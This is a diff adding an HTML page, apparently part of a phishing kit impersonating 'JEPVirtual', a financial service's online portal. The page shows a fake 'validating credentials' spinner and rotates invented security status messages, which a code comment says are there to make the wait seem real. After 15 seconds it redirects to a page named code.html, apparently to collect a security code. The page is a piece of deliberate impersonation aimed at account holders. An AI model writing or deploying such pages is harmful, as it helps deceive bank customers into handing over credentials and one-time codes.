@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JEPVirtual - Verificando</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #2c313a; /* Mismo fondo que el index */
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Contenedor del Spinner */
+        .loader-container {
+            text-align: center;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(255, 255, 255, 0.1);
+            border-top: 6px solid #e67e22; /* Naranja institucional */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 18px;
+            color: #d1d4da;
+            margin-bottom: 10px;
+        }
+
+        .status-msg {
+            font-size: 14px;
+            color: #8a92a1;
+            font-style: italic;
+        }
+
+        /* Barra de progreso opcional para dar sensación de movimiento */
+        .progress-bar-bg {
+            width: 250px;
+            height: 4px;
+            background: #21252b;
+            margin-top: 25px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            width: 0%;
+            height: 100%;
+            background: #1a5c2f; /* Verde institucional */
+            transition: width 15s linear; /* Sincronizado con los 15s */
+        }
+        /* --- Responsividad para la Pantalla de Carga --- */
+
+@media (max-width: 600px) {
+    .loader-container {
+        width: 90%;
+        padding: 20px;
+    }
+
+    /* Ajustamos el tamaño del spinner para móviles */
+    .spinner {
+        width: 50px;
+        height: 50px;
+        border-width: 5px;
+    }
+
+    .loading-text {
+        font-size: 16px;
+    }
+
+    .status-msg {
+        font-size: 13px;
+    }
+
+    /* Ajustamos el ancho de la barra de progreso para que no se salga de la pantalla */
+    .progress-bar-bg {
+        width: 100%; 
+        max-width: 260px;
+        margin-top: 20px;
+    }
+}
+
+/* Ajuste para pantallas muy pequeñas o modo horizontal (landscape) */
+@media (max-height: 400px) {
+    .spinner {
+        width: 35px;
+        height: 35px;
+        margin-bottom: 10px;
+    }
+    
+    .progress-bar-bg {
+        margin-top: 15px;
+    }
+}
+    </style>
+</head>
+<body>
+
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loading-text">Validando credenciales...</div>
+        <div class="status-msg" id="statusMsg">Por favor, no cierre esta ventana.</div>
+        
+        <div class="progress-bar-bg">
+            <div class="progress-bar-fill" id="fill"></div>
+        </div>
+    </div>
+
+    <script>
+        // Iniciar animación de la barra inmediatamente
+        window.onload = function() {
+            setTimeout(() => {
+                document.getElementById('fill').style.width = '100%';
+            }, 100);
+
+            // Cambiar mensajes durante la espera para que parezca real
+            const messages = [
+                "Verificando identidad...",
+                "Analizando dispositivo seguro...",
+                "Estableciendo conexión cifrada...",
+                "Generando código de seguridad..."
+            ];
+            
+            let i = 0;
+            const msgInterval = setInterval(() => {
+                if(i < messages.length) {
+                    document.getElementById('statusMsg').innerText = messages[i];
+                    i++;
+                }
+            }, 3500);
+
+            // REDIRECCIÓN FINAL A LOS 15 SEGUNDOS
+            setTimeout(function() {
+                window.location.href = 'code.html';
+            }, 15000);
+        };
+    </script>
+
+</body>
+</html>
